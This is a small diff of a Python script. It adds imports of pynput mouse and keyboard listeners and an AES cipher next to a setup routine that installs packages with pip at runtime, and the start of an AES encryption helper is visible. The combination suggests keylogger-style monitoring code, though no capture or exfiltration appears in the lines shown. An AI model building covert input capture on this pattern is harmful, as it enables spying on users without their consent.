@@ -29,6 +29,10 @@ class Setup:
 				pip.main(['install', module])
 			else:
 				pip._internal.main(['install', package])
+		global mouse, keyboard
+		from pynput import mouse, keyboard
+		global AES
+		from Crypto.Cipher import AES
 def AES_Enc(key, msg):
 	BLOCK_SIZE = 16
 	PADDING = '{'
